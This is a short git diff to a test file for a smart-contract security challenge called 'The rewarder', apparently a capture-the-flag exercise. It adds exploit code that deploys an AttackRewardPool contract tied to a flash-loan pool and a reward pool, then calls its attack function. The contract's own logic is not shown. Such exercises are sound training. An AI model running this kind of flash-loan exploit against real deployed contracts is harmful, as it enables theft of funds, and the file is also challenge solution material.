@@ -66,6 +66,16 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        const AttackFactory = await ethers.getContractFactory('AttackRewardPool', attacker);
+        this.AttackContract = await AttackFactory.deploy(
+            this.flashLoanPool.address,
+            this.rewarderPool.address,
+            this.liquidityToken.address,
+            this.rewardToken.address
+        );
+
+        await this.AttackContract.attack()
     });
 
     after(async function () {
